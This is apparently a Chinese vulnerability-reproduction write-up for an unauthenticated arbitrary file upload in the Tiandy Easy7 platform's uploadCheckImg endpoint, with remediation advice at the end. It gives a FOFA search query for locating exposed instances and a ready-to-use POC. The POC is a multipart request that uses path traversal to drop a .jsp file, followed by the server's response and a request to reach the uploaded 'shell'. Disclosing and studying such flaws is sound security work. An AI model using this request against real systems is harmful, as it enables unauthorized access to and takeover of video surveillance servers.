# 漏洞复现 | 天地伟业Easy7 uploadCheckImg 文件上传漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | 天地伟业Easy7 uploadCheckImg 文件上传漏洞 |
| 漏洞类型 | 文件上传 |
| 组件 | 天地伟业Easy7 |
| 严重程度 | 高危 |

## 漏洞概述

天地伟业Easy7 uploadCheckImg接口存在文件上传漏洞，未经身份验证的攻击者可通过构造恶意上传请求，绕过文件类型限制，将任意文件上传至服务器，进而可能实现远程代码执行或服务器控制，影响系统的完整性和安全性。

## FOFA查询语法

```ini
app="Tiandy-Easy7"
```

## 漏洞复现

### POC

**上传请求**
```http
POST /Easy7/rest/file/uploadCheckImg?fileName=1d395dpdejuf.jsp&uploadPicturePath=/../../root/tiandy/data/ HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: image/jpeg

3BqwO7fDV1F354VmmAYJtZp0eHm
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

**响应**
```http
HTTP/1.1 200 OK
{"fullName":"/../root/tiandy/data/","arrFileNames":[],"fileName":"1d395dpdejuf.jsp","uuid":"","url":""}
```

**访问Shell**
```http
GET /imagelive/1d395dpdejuf.jsp HTTP/1.1
```

### 特征

- 上传路径：`/Easy7/rest/file/uploadCheckImg`
- 路径穿越：`uploadPicturePath=/../../root/tiandy/data/`
- 访问路径：`/imagelive/filename.jsp`
- 响应特征：`{"fullName":"/../root/tiandy/data/",...}`

## 修复建议

1. 严格限制上传文件类型
2. 对上传文件进行内容检测
3. 上传目录禁止执行脚本
4. 增加身份验证机制

---

*来源：实战安全研究 | 原文链接：https://mp.weixin.qq.com/s/UF8Yu8O3yuN035kpa2gVtQ*